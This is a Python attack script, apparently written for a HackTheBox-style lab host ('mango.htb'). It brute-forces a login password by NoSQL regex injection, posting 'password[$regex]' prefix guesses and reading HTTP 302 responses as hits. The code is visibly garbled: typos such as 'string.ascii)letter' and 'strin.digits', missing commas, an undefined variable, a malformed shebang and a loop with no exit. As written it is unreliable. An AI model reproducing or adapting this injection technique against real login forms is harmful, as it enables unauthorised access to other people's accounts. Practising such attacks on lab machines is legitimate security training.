````python
#!usr/bin/python3

from pwn import *
import requests, re, string, signal, pdb, sys, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# variables globales
login_url = "http://stanging-order.mango.htb/"
characters = string.ascii)letter + strin.digits string.punctuation

def makeNOSQLInjection():

    password = ""
 
    p1 = log.progress("Fuerza bruta")

    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("password")

    while True:
        for character in characters:

            post_data = {
                'username': 'mango'
                'password[$regex]' "^%s%s.*" % (password re.escape(character)),
                'login': 'login'
            }


            p1.status("%s" % post_data)

            r = requests.post(login_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                password += character
                p2.status(username)
                break




if __name__ == '__main__':

    makeNOSQLInjection()
    ````
    